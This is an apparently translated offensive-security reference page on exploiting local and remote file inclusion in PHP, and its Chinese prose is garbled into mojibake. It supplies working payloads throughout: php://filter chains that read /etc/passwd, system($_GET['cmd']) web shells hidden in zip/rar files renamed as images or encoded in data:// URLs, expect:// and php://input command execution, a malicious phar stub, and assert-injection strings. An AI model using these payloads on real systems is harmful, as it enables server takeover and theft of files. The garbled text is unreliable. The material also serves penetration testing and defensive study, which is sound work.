<h2 id="java-åˆ—å‡ºç›®å½•"><a class="header" href="#java-åˆ—å‡ºç›®å½•">Java åˆ—å‡ºç›®å½•</a></h2>
<p>çœ‹èµ·æ¥å¦‚æœä½ åœ¨ Java ä¸­æœ‰è·¯å¾„éå†å¹¶ä¸”ä½ <strong>è¯·æ±‚ä¸€ä¸ªç›®å½•</strong>è€Œä¸æ˜¯æ–‡ä»¶ï¼Œ<strong>å°†è¿”å›è¯¥ç›®å½•çš„åˆ—è¡¨</strong>ã€‚åœ¨å…¶ä»–è¯­è¨€ä¸­ï¼ˆæ®æˆ‘æ‰€çŸ¥ï¼‰ä¸ä¼šå‘ç”Ÿè¿™ç§æƒ…å†µã€‚</p>
<h2 id="å‰25ä¸ªå‚æ•°"><a class="header" href="#å‰25ä¸ªå‚æ•°">å‰25ä¸ªå‚æ•°</a></h2>
<p>ä»¥ä¸‹æ˜¯å¯èƒ½å®¹æ˜“å—åˆ°æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼ˆLFIï¼‰æ¼æ´å½±å“çš„å‰25ä¸ªå‚æ•°åˆ—è¡¨ï¼ˆæ¥è‡ª<a href="https://twitter.com/trbughunters/status/1279768631845494787">é“¾æ¥</a>ï¼‰ï¼š</p>
<pre><code>?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
</code></pre>
<h2 id="lfi--rfi-ä½¿ç”¨-php-åŒ…è£…å™¨å’Œåè®®"><a class="header" href="#lfi--rfi-ä½¿ç”¨-php-åŒ…è£…å™¨å’Œåè®®">LFI / RFI ä½¿ç”¨ PHP åŒ…è£…å™¨å’Œåè®®</a></h2>
<h3 id="phpfilter"><a class="header" href="#phpfilter">php://filter</a></h3>
<p>PHP è¿‡æ»¤å™¨å…è®¸åœ¨æ•°æ®è¢«è¯»å–æˆ–å†™å…¥ä¹‹å‰æ‰§è¡ŒåŸºæœ¬çš„ <strong>ä¿®æ”¹æ“ä½œ</strong>ã€‚è¿‡æ»¤å™¨åˆ†ä¸º 5 ç±»ï¼š</p>
<ul>
<li><a href="https://www.php.net/manual/en/filters.string.php">å­—ç¬¦ä¸²è¿‡æ»¤å™¨</a>:</li>
<li><code>string.rot13</code></li>
<li><code>string.toupper</code></li>
<li><code>string.tolower</code></li>
<li><code>string.strip_tags</code>: ä»æ•°æ®ä¸­ç§»é™¤æ ‡ç­¾ï¼ˆåœ¨ "&lt;" å’Œ "&gt;" å­—ç¬¦ä¹‹é—´çš„æ‰€æœ‰å†…å®¹ï¼‰</li>
<li>è¯·æ³¨æ„ï¼Œè¿™ä¸ªè¿‡æ»¤å™¨åœ¨ç°ä»£ç‰ˆæœ¬çš„ PHP ä¸­å·²ç»æ¶ˆå¤±</li>
<li><a href="https://www.php.net/manual/en/filters.convert.php">è½¬æ¢è¿‡æ»¤å™¨</a></li>
<li><code>convert.base64-encode</code></li>
<li><code>convert.base64-decode</code></li>
<li><code>convert.quoted-printable-encode</code></li>
<li><code>convert.quoted-printable-decode</code></li>
<li><code>convert.iconv.*</code> : è½¬æ¢ä¸ºä¸åŒçš„ç¼–ç (<code>convert.iconv.&lt;input_enc&gt;.&lt;output_enc&gt;</code>)ã€‚è¦è·å– <strong>æ‰€æœ‰æ”¯æŒçš„ç¼–ç åˆ—è¡¨</strong>ï¼Œè¯·åœ¨æ§åˆ¶å°ä¸­è¿è¡Œï¼š<code>iconv -l</code></li>
</ul>
<p>{% hint style="warning" %}
æ»¥ç”¨ <code>convert.iconv.*</code> è½¬æ¢è¿‡æ»¤å™¨å¯ä»¥ <strong>ç”Ÿæˆä»»æ„æ–‡æœ¬</strong>ï¼Œè¿™å¯èƒ½å¯¹å†™å…¥ä»»æ„æ–‡æœ¬æˆ–ä½¿å‡½æ•°å¦‚åŒ…å«è¿‡ç¨‹å¤„ç†ä»»æ„æ–‡æœ¬æœ‰ç”¨ã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ <a href="lfi2rce-via-php-filters.html"><strong>é€šè¿‡ php è¿‡æ»¤å™¨çš„ LFI2RCE</strong></a>ã€‚
{% endhint %}</p>
<ul>
<li><a href="https://www.php.net/manual/en/filters.compression.php">å‹ç¼©è¿‡æ»¤å™¨</a></li>
<li><code>zlib.deflate</code>: å‹ç¼©å†…å®¹ï¼ˆå¦‚æœæå–å¤§é‡ä¿¡æ¯æ—¶å¾ˆæœ‰ç”¨ï¼‰</li>
<li><code>zlib.inflate</code>: è§£å‹æ•°æ®</li>
<li><a href="https://www.php.net/manual/en/filters.encryption.php">åŠ å¯†è¿‡æ»¤å™¨</a></li>
<li><code>mcrypt.*</code> : å·²å¼ƒç”¨</li>
<li><code>mdecrypt.*</code> : å·²å¼ƒç”¨</li>
<li>å…¶ä»–è¿‡æ»¤å™¨</li>
<li>åœ¨ php ä¸­è¿è¡Œ <code>var_dump(stream_get_filters());</code> å¯ä»¥æ‰¾åˆ°å‡ ä¸ª <strong>æ„å¤–çš„è¿‡æ»¤å™¨</strong>ï¼š</li>
<li><code>consumed</code></li>
<li><code>dechunk</code>: åè½¬ HTTP åˆ†å—ç¼–ç </li>
<li><code>convert.*</code></li>
</ul>
<pre><code class="language-php"># String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,&lt;b&gt;Bold&lt;/b&gt;&lt;?php php code; ?&gt;lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,Â£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
</code></pre>
<p>{% hint style="warning" %}
éƒ¨åˆ† "php://filter" ä¸åŒºåˆ†å¤§å°å†™
{% endhint %}</p>
<h3 id="ä½¿ç”¨-php-è¿‡æ»¤å™¨ä½œä¸º-oracle-è¯»å–ä»»æ„æ–‡ä»¶"><a class="header" href="#ä½¿ç”¨-php-è¿‡æ»¤å™¨ä½œä¸º-oracle-è¯»å–ä»»æ„æ–‡ä»¶">ä½¿ç”¨ php è¿‡æ»¤å™¨ä½œä¸º oracle è¯»å–ä»»æ„æ–‡ä»¶</a></h3>
<p><a href="https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle"><strong>åœ¨è¿™ç¯‡æ–‡ç« ä¸­</strong></a> æå‡ºäº†ä¸€ç§åœ¨ä¸ä»æœåŠ¡å™¨è¿”å›è¾“å‡ºçš„æƒ…å†µä¸‹è¯»å–æœ¬åœ°æ–‡ä»¶çš„æŠ€æœ¯ã€‚è¯¥æŠ€æœ¯åŸºäº <strong>ä½¿ç”¨ php è¿‡æ»¤å™¨ä½œä¸º oracle çš„æ–‡ä»¶å¸ƒå°”å¤–æ³„ï¼ˆé€å­—ç¬¦ï¼‰</strong>ã€‚è¿™æ˜¯å› ä¸º php è¿‡æ»¤å™¨å¯ä»¥ç”¨æ¥ä½¿æ–‡æœ¬å˜å¾—è¶³å¤Ÿå¤§ï¼Œä»è€Œä½¿ php æŠ›å‡ºå¼‚å¸¸ã€‚</p>
<p>åœ¨åŸå§‹æ–‡ç« ä¸­å¯ä»¥æ‰¾åˆ°è¯¥æŠ€æœ¯çš„è¯¦ç»†è§£é‡Šï¼Œä½†è¿™é‡Œæ˜¯ä¸€ä¸ªå¿«é€Ÿæ€»ç»“ï¼š</p>
<ul>
<li>ä½¿ç”¨ç¼–ç  <strong><code>UCS-4LE</code></strong> å°†æ–‡æœ¬çš„å‰å¯¼å­—ç¬¦ç•™åœ¨å¼€å¤´ï¼Œå¹¶ä½¿å­—ç¬¦ä¸²çš„å¤§å°å‘ˆæŒ‡æ•°çº§å¢é•¿ã€‚</li>
<li>è¿™å°†ç”¨äºç”Ÿæˆä¸€ä¸ª <strong>å½“åˆå§‹å­—æ¯æ­£ç¡®çŒœæµ‹æ—¶éå¸¸å¤§çš„æ–‡æœ¬</strong>ï¼Œä»¥è‡³äº php ä¼šè§¦å‘ä¸€ä¸ª <strong>é”™è¯¯</strong>ã€‚</li>
<li><strong>dechunk</strong> è¿‡æ»¤å™¨å°† <strong>åˆ é™¤æ‰€æœ‰å†…å®¹ï¼Œå¦‚æœç¬¬ä¸€ä¸ªå­—ç¬¦ä¸æ˜¯åå…­è¿›åˆ¶</strong>ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥çŸ¥é“ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯å¦æ˜¯åå…­è¿›åˆ¶ã€‚</li>
<li>è¿™ä¸å‰ä¸€ä¸ªç»“åˆï¼ˆä»¥åŠå…¶ä»–æ ¹æ®çŒœæµ‹å­—æ¯çš„è¿‡æ»¤å™¨ï¼‰ï¼Œå°†å…è®¸æˆ‘ä»¬é€šè¿‡æŸ¥çœ‹ä½•æ—¶è¿›è¡Œè¶³å¤Ÿçš„è½¬æ¢ä½¿å…¶ä¸å†æ˜¯åå…­è¿›åˆ¶å­—ç¬¦æ¥çŒœæµ‹æ–‡æœ¬å¼€å¤´çš„å­—æ¯ã€‚å› ä¸ºå¦‚æœæ˜¯åå…­è¿›åˆ¶ï¼Œdechunk ä¸ä¼šåˆ é™¤å®ƒï¼Œåˆå§‹ç‚¸å¼¹å°†å¯¼è‡´ php é”™è¯¯ã€‚</li>
<li>ç¼–ç  <strong>convert.iconv.UNICODE.CP930</strong> å°†æ¯ä¸ªå­—æ¯è½¬æ¢ä¸ºä¸‹ä¸€ä¸ªï¼ˆå› æ­¤åœ¨æ­¤ç¼–ç åï¼ša -&gt; bï¼‰ã€‚è¿™ä½¿æˆ‘ä»¬èƒ½å¤Ÿå‘ç°ç¬¬ä¸€ä¸ªå­—æ¯æ˜¯å¦æ˜¯ <code>a</code>ï¼Œä¾‹å¦‚ï¼Œå› ä¸ºå¦‚æœæˆ‘ä»¬åº”ç”¨ 6 æ¬¡æ­¤ç¼–ç  a-&gt;b-&gt;c-&gt;d-&gt;e-&gt;f-&gt;gï¼Œè¯¥å­—æ¯ä¸å†æ˜¯åå…­è¿›åˆ¶å­—ç¬¦ï¼Œå› æ­¤ dechunk ä¸ä¼šåˆ é™¤å®ƒï¼Œphp é”™è¯¯è¢«è§¦å‘ï¼Œå› ä¸ºå®ƒä¸åˆå§‹ç‚¸å¼¹ç›¸ä¹˜ã€‚</li>
<li>åœ¨å¼€å¤´ä½¿ç”¨å…¶ä»–è½¬æ¢å¦‚ <strong>rot13</strong> å¯ä»¥æ³„éœ²å…¶ä»–å­—ç¬¦å¦‚ n, o, p, q, rï¼ˆå…¶ä»–ç¼–ç å¯ä»¥ç”¨äºå°†å…¶ä»–å­—æ¯ç§»åŠ¨åˆ°åå…­è¿›åˆ¶èŒƒå›´ï¼‰ã€‚</li>
<li>å½“åˆå§‹å­—ç¬¦æ˜¯æ•°å­—æ—¶ï¼Œéœ€è¦å¯¹å…¶è¿›è¡Œ base64 ç¼–ç å¹¶æ³„éœ²å‰ä¸¤ä¸ªå­—æ¯ä»¥æ³„éœ²è¯¥æ•°å­—ã€‚</li>
<li>æœ€åä¸€ä¸ªé—®é¢˜æ˜¯æŸ¥çœ‹ <strong>å¦‚ä½•æ³„éœ²è¶…è¿‡åˆå§‹å­—æ¯</strong>ã€‚é€šè¿‡ä½¿ç”¨é¡ºåºå†…å­˜è¿‡æ»¤å™¨å¦‚ <strong>convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE</strong> å¯ä»¥æ”¹å˜å­—ç¬¦çš„é¡ºåºï¼Œå¹¶åœ¨æ–‡æœ¬çš„ç¬¬ä¸€ä½ç½®è·å–å…¶ä»–å­—æ¯ã€‚</li>
<li>ä¸ºäº†èƒ½å¤Ÿè·å– <strong>æ›´å¤šæ•°æ®</strong>ï¼Œæƒ³æ³•æ˜¯ <strong>åœ¨å¼€å¤´ç”Ÿæˆ 2 å­—èŠ‚çš„åƒåœ¾æ•°æ®</strong>ï¼Œä½¿ç”¨ <strong>convert.iconv.UTF16.UTF16</strong>ï¼Œåº”ç”¨ <strong>UCS-4LE</strong> ä½¿å…¶ <strong>ä¸æ¥ä¸‹æ¥çš„ 2 å­—èŠ‚è¿›è¡Œæ¢è½´</strong>ï¼Œå¹¶ <strong>åˆ é™¤æ•°æ®ç›´åˆ°åƒåœ¾æ•°æ®</strong>ï¼ˆè¿™å°†åˆ é™¤åˆå§‹æ–‡æœ¬çš„å‰ 2 å­—èŠ‚ï¼‰ã€‚ç»§ç»­è¿™æ ·åšï¼Œç›´åˆ°è¾¾åˆ°æ‰€éœ€çš„æ³„éœ²ä½ã€‚</li>
</ul>
<p>åœ¨æ–‡ç« ä¸­è¿˜æ³„éœ²äº†ä¸€ç§è‡ªåŠ¨æ‰§è¡Œæ­¤æ“ä½œçš„å·¥å…·ï¼š<a href="https://github.com/synacktiv/php_filter_chains_oracle_exploit">php_filters_chain_oracle_exploit</a>ã€‚</p>
<h3 id="phpfd"><a class="header" href="#phpfd">php://fd</a></h3>
<p>æ­¤åŒ…è£…å™¨å…è®¸è®¿é—®è¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦ã€‚å¯èƒ½å¯¹å¤–æ³„æ‰“å¼€æ–‡ä»¶çš„å†…å®¹æœ‰ç”¨ï¼š</p>
<pre><code class="language-php">echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
</code></pre>
<p>æ‚¨è¿˜å¯ä»¥ä½¿ç”¨ <strong>php://stdin, php://stdout å’Œ php://stderr</strong> åˆ†åˆ«è®¿é—® <strong>æ–‡ä»¶æè¿°ç¬¦ 0, 1 å’Œ 2</strong>ï¼ˆä¸ç¡®å®šè¿™åœ¨æ”»å‡»ä¸­å¦‚ä½•æœ‰ç”¨ï¼‰</p>
<h3 id="zip-å’Œ-rar"><a class="header" href="#zip-å’Œ-rar">zip:// å’Œ rar://</a></h3>
<p>ä¸Šä¼ ä¸€ä¸ªåŒ…å« PHPShell çš„ Zip æˆ– Rar æ–‡ä»¶å¹¶è®¿é—®å®ƒã€‚<br />
ä¸ºäº†èƒ½å¤Ÿåˆ©ç”¨ rar åè®®ï¼Œå®ƒ <strong>éœ€è¦è¢«ç‰¹åˆ«æ¿€æ´»</strong>ã€‚</p>
<pre><code class="language-bash">echo "&lt;pre&gt;&lt;?php system($_GET['cmd']); ?&gt;&lt;/pre&gt;" &gt; payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
</code></pre>
<h3 id="data"><a class="header" href="#data">data://</a></h3>
<pre><code>http://example.net/?page=data://text/plain,&lt;?php echo base64_encode(file_get_contents("index.php")); ?&gt;
http://example.net/?page=data://text/plain,&lt;?php phpinfo(); ?&gt;
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,&lt;?php echo base64_encode(file_get_contents("index.php")); ?&gt;
http://example.net/?page=data:text/plain,&lt;?php phpinfo(); ?&gt;
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "&lt;?php system($_GET['cmd']);echo 'Shell done !'; ?&gt;"
</code></pre>
<p>æ³¨æ„ï¼Œæ­¤åè®®å— php é…ç½® <strong><code>allow_url_open</code></strong> å’Œ <strong><code>allow_url_include</code></strong> çš„é™åˆ¶ã€‚</p>
<h3 id="expect"><a class="header" href="#expect">expect://</a></h3>
<p>å¿…é¡»æ¿€æ´» Expectã€‚æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹å¼æ‰§è¡Œä»£ç ï¼š</p>
<pre><code>http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
</code></pre>
<h3 id="input"><a class="header" href="#input">input://</a></h3>
<p>åœ¨POSTå‚æ•°ä¸­æŒ‡å®šæ‚¨çš„æœ‰æ•ˆè½½è·ï¼š</p>
<pre><code class="language-bash">curl -XPOST "http://example.com/index.php?page=php://input" --data "&lt;?php system('id'); ?&gt;"
</code></pre>
<h3 id="phar"><a class="header" href="#phar">phar://</a></h3>
<p>ä¸€ä¸ª <code>.phar</code> æ–‡ä»¶å¯ä»¥åœ¨ web åº”ç”¨ç¨‹åºåˆ©ç”¨ <code>include</code> ç­‰å‡½æ•°è¿›è¡Œæ–‡ä»¶åŠ è½½æ—¶æ‰§è¡Œ PHP ä»£ç ã€‚ä¸‹é¢æä¾›çš„ PHP ä»£ç ç‰‡æ®µæ¼”ç¤ºäº†å¦‚ä½•åˆ›å»ºä¸€ä¸ª <code>.phar</code> æ–‡ä»¶ï¼š</p>
<pre><code class="language-php">&lt;?php
$phar = new Phar('test.phar');
$phar-&gt;startBuffering();
$phar-&gt;addFromString('test.txt', 'text');
$phar-&gt;setStub('&lt;?php __HALT_COMPILER(); system("ls"); ?&gt;');
$phar-&gt;stopBuffering();
</code></pre>
<p>è¦ç¼–è¯‘ <code>.phar</code> æ–‡ä»¶ï¼Œåº”æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p>
<pre><code class="language-bash">php --define phar.readonly=0 create_path.php
</code></pre>
<p>åœ¨æ‰§è¡Œæ—¶ï¼Œå°†åˆ›å»ºä¸€ä¸ªåä¸º <code>test.phar</code> çš„æ–‡ä»¶ï¼Œè¿™å¯èƒ½è¢«åˆ©ç”¨æ¥åˆ©ç”¨æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼ˆLFIï¼‰æ¼æ´ã€‚</p>
<p>åœ¨ LFI ä»…æ‰§è¡Œæ–‡ä»¶è¯»å–è€Œä¸æ‰§è¡Œ PHP ä»£ç çš„æƒ…å†µä¸‹ï¼Œé€šè¿‡ <code>file_get_contents()</code>ã€<code>fopen()</code>ã€<code>file()</code>ã€<code>file_exists()</code>ã€<code>md5_file()</code>ã€<code>filemtime()</code> æˆ– <code>filesize()</code> ç­‰å‡½æ•°ï¼Œå¯ä»¥å°è¯•åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´ã€‚æ­¤æ¼æ´ä¸ä½¿ç”¨ <code>phar</code> åè®®è¯»å–æ–‡ä»¶æœ‰å…³ã€‚</p>
<p>æœ‰å…³åœ¨ <code>.phar</code> æ–‡ä»¶ä¸Šä¸‹æ–‡ä¸­åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´çš„è¯¦ç»†ç†è§£ï¼Œè¯·å‚é˜…ä»¥ä¸‹é“¾æ¥çš„æ–‡æ¡£ï¼š</p>
<p><a href="phar-deserialization.html">Phar Deserialization Exploitation Guide</a></p>
<p>{% content-ref url="phar-deserialization.md" %}
<a href="phar-deserialization.html">phar-deserialization.md</a>
{% endcontent-ref %}</p>
<h3 id="cve-2024-2961"><a class="header" href="#cve-2024-2961">CVE-2024-2961</a></h3>
<p>å¯ä»¥æ»¥ç”¨ <strong>ä»»ä½•æ”¯æŒ php è¿‡æ»¤å™¨çš„ PHP ä¸­çš„ä»»æ„æ–‡ä»¶è¯»å–</strong> æ¥è·å¾— RCEã€‚è¯¦ç»†æè¿°å¯ä»¥åœ¨ <a href="https://www.ambionics.io/blog/iconv-cve-2024-2961-p1"><strong>æ­¤å¸–å­ä¸­æ‰¾åˆ°</strong></a><strong>.</strong><br />
éå¸¸ç®€è¦çš„æ€»ç»“ï¼šåœ¨ PHP å †ä¸­æ»¥ç”¨ <strong>3 å­—èŠ‚æº¢å‡º</strong> æ¥ <strong>æ›´æ”¹ç‰¹å®šå¤§å°çš„ç©ºé—²å—é“¾</strong>ï¼Œä»¥ä¾¿èƒ½å¤Ÿ <strong>åœ¨ä»»ä½•åœ°å€å†™å…¥ä»»ä½•å†…å®¹</strong>ï¼Œå› æ­¤æ·»åŠ äº†ä¸€ä¸ªé’©å­æ¥è°ƒç”¨ <strong><code>system</code></strong>ã€‚<br />
å¯ä»¥é€šè¿‡æ»¥ç”¨æ›´å¤šçš„ php è¿‡æ»¤å™¨æ¥åˆ†é…ç‰¹å®šå¤§å°çš„å—ã€‚</p>
<h3 id="æ›´å¤šåè®®"><a class="header" href="#æ›´å¤šåè®®">æ›´å¤šåè®®</a></h3>
<p>æ£€æŸ¥æ›´å¤šå¯èƒ½çš„ <a href="https://www.php.net/manual/en/wrappers.php"><strong>åè®®ä»¥åŒ…å«åœ¨è¿™é‡Œ</strong></a><strong>:</strong></p>
<ul>
<li><a href="https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory">php://memory and php://temp</a> â€” åœ¨å†…å­˜æˆ–ä¸´æ—¶æ–‡ä»¶ä¸­å†™å…¥ï¼ˆä¸ç¡®å®šè¿™åœ¨æ–‡ä»¶åŒ…å«æ”»å‡»ä¸­å¦‚ä½•æœ‰ç”¨ï¼‰</li>
<li><a href="https://www.php.net/manual/en/wrappers.file.php">file://</a> â€” è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ</li>
<li><a href="https://www.php.net/manual/en/wrappers.http.php">http://</a> â€” è®¿é—® HTTP(s) URL</li>
<li><a href="https://www.php.net/manual/en/wrappers.ftp.php">ftp://</a> â€” è®¿é—® FTP(s) URL</li>
<li><a href="https://www.php.net/manual/en/wrappers.compression.php">zlib://</a> â€” å‹ç¼©æµ</li>
<li><a href="https://www.php.net/manual/en/wrappers.glob.php">glob://</a> â€” æŸ¥æ‰¾åŒ¹é…æ¨¡å¼çš„è·¯å¾„åï¼ˆå®ƒä¸è¿”å›ä»»ä½•å¯æ‰“å°çš„å†…å®¹ï¼Œå› æ­¤åœ¨è¿™é‡Œå¹¶ä¸çœŸæ­£æœ‰ç”¨ï¼‰</li>
<li><a href="https://www.php.net/manual/en/wrappers.ssh2.php">ssh2://</a> â€” å®‰å…¨å¤–å£³ 2</li>
<li><a href="https://www.php.net/manual/en/wrappers.audio.php">ogg://</a> â€” éŸ³é¢‘æµï¼ˆä¸é€‚åˆè¯»å–ä»»æ„æ–‡ä»¶ï¼‰</li>
</ul>
<h2 id="é€šè¿‡-php-çš„-assert-è¿›è¡Œ-lfi"><a class="header" href="#é€šè¿‡-php-çš„-assert-è¿›è¡Œ-lfi">é€šè¿‡ PHP çš„ 'assert' è¿›è¡Œ LFI</a></h2>
<p>åœ¨å¤„ç† 'assert' å‡½æ•°æ—¶ï¼ŒPHP ä¸­çš„æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼ˆLFIï¼‰é£é™©æ˜¾è‘—è¾ƒé«˜ï¼Œå› ä¸ºå®ƒå¯ä»¥åœ¨å­—ç¬¦ä¸²ä¸­æ‰§è¡Œä»£ç ã€‚å¦‚æœè¾“å…¥åŒ…å«ç›®å½•éå†å­—ç¬¦å¦‚ ".." è¢«æ£€æŸ¥ä½†æœªæ­£ç¡®æ¸…ç†ï¼Œè¿™å°¤å…¶æˆé—®é¢˜ã€‚</p>
<p>ä¾‹å¦‚ï¼ŒPHP ä»£ç å¯èƒ½è¢«è®¾è®¡ä¸ºé˜²æ­¢ç›®å½•éå†ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<pre><code class="language-bash">assert("strpos('$file', '..') === false") or die("");
</code></pre>
<p>è™½ç„¶è¿™æ—¨åœ¨é˜»æ­¢éå†ï¼Œä½†ä¸ç»æ„é—´åˆ›å»ºäº†ä»£ç æ³¨å…¥çš„å‘é‡ã€‚ä¸ºäº†åˆ©ç”¨è¿™ä¸€ç‚¹è¯»å–æ–‡ä»¶å†…å®¹ï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨ï¼š</p>
<pre><code class="language-plaintext">' and die(highlight_file('/etc/passwd')) or '
</code></pre>
<p>åŒæ ·ï¼Œå¯¹äºæ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ï¼Œå¯ä»¥ä½¿ç”¨ï¼š</p>
<pre><code class="language-plaintext">' and die(system("id")) or '
</code></pre>
<p>é‡è¦çš„æ˜¯è¦<strong>å¯¹è¿™äº›æœ‰æ•ˆè½½è·è¿›è¡ŒURLç¼–ç </strong>ã€‚</p>
<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
<p>åŠ å…¥<a href="https://discord.com/invite/N3FrSbmwdy"><strong>HackenProof Discord</strong></a>æœåŠ¡å™¨ï¼Œä¸ç»éªŒä¸°å¯Œçš„é»‘å®¢å’Œæ¼æ´èµé‡‘çŒäººäº¤æµï¼</p>
<p><strong>é»‘å®¢è§è§£</strong><br />
å‚ä¸æ·±å…¥æ¢è®¨é»‘å®¢çš„åˆºæ¿€ä¸æŒ‘æˆ˜çš„å†…å®¹</p>
<p><strong>å®æ—¶é»‘å®¢æ–°é—»</strong><br />
é€šè¿‡å®æ—¶æ–°é—»å’Œè§è§£ï¼Œè·Ÿä¸Šå¿«é€Ÿå˜åŒ–çš„é»‘å®¢ä¸–ç•Œ</p>
<p><strong>æœ€æ–°å…¬å‘Š</strong><br />
äº†è§£æœ€æ–°çš„æ¼æ´èµé‡‘å‘å¸ƒå’Œé‡è¦å¹³å°æ›´æ–°</p>
<p><strong>åŠ å…¥æˆ‘ä»¬</strong> <a href="https://discord.com/invite/N3FrSbmwdy"><strong>Discord</strong></a>ï¼Œä»Šå¤©å°±å¼€å§‹ä¸é¡¶çº§é»‘å®¢åˆä½œå§ï¼</p>
<h2 id="phpç›²è·¯å¾„éå†"><a class="header" href="#phpç›²è·¯å¾„éå†">PHPç›²è·¯å¾„éå†</a></h2>
<p>{% hint style="warning" %}
æ­¤æŠ€æœ¯é€‚ç”¨äºæ‚¨<strong>æ§åˆ¶</strong>ä¸€ä¸ª<strong>PHPå‡½æ•°</strong>çš„<strong>æ–‡ä»¶è·¯å¾„</strong>çš„æƒ…å†µï¼Œè¯¥å‡½æ•°å°†<strong>è®¿é—®ä¸€ä¸ªæ–‡ä»¶</strong>ä½†æ‚¨çœ‹ä¸åˆ°æ–‡ä»¶çš„å†…å®¹ï¼ˆå¦‚ç®€å•è°ƒç”¨**<code>file()</code>**ï¼‰ä½†å†…å®¹æœªæ˜¾ç¤ºã€‚
{% endhint %}</p>
<p>åœ¨<a href="https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html"><strong>è¿™ç¯‡ç²¾å½©çš„æ–‡ç« </strong></a>ä¸­è§£é‡Šäº†å¦‚ä½•é€šè¿‡PHPè¿‡æ»¤å™¨æ»¥ç”¨ç›²è·¯å¾„éå†ä»¥<strong>é€šè¿‡é”™è¯¯oracleæå–æ–‡ä»¶å†…å®¹</strong>ã€‚</p>
<p>æ€»ä¹‹ï¼Œè¯¥æŠ€æœ¯ä½¿ç”¨**"UCS-4LE"ç¼–ç <strong>ä½¿æ–‡ä»¶å†…å®¹å˜å¾—å¦‚æ­¤</strong>åºå¤§**ï¼Œä»¥è‡³äº<strong>æ‰“å¼€</strong>è¯¥æ–‡ä»¶çš„<strong>PHPå‡½æ•°</strong>å°†è§¦å‘ä¸€ä¸ª<strong>é”™è¯¯</strong>ã€‚</p>
<p>ç„¶åï¼Œä¸ºäº†æ³„éœ²ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œä½¿ç”¨è¿‡æ»¤å™¨**<code>dechunk</code><strong>ï¼Œä»¥åŠå…¶ä»–å¦‚</strong>base64<strong>æˆ–</strong>rot13**ï¼Œæœ€åä½¿ç”¨è¿‡æ»¤å™¨<strong>convert.iconv.UCS-4.UCS-4LE</strong>å’Œ<strong>convert.iconv.UTF16.UTF-16BE</strong>æ¥<strong>åœ¨å¼€å¤´æ”¾ç½®å…¶ä»–å­—ç¬¦å¹¶æ³„éœ²å®ƒä»¬</strong>ã€‚</p>
<p><strong>å¯èƒ½å­˜åœ¨æ¼æ´çš„å‡½æ•°</strong>ï¼š<code>file_get_contents</code>, <code>readfile</code>, <code>finfo-&gt;file</code>, <code>getimagesize</code>, <code>md5_file</code>, <code>sha1_file</code>, <code>hash_file</code>, <code>file</code>, <code>parse_ini_file</code>, <code>copy</code>, <code>file_put_contents (ä»…é™ç›®æ ‡åªè¯»)</code>, <code>stream_get_contents</code>, <code>fgets</code>, <code>fread</code>, <code>fgetc</code>, <code>fgetcsv</code>, <code>fpassthru</code>, <code>fputs</code></p>
<p>æœ‰å…³æŠ€æœ¯ç»†èŠ‚ï¼Œè¯·æŸ¥çœ‹ä¸Šè¿°æ–‡ç« ï¼</p>
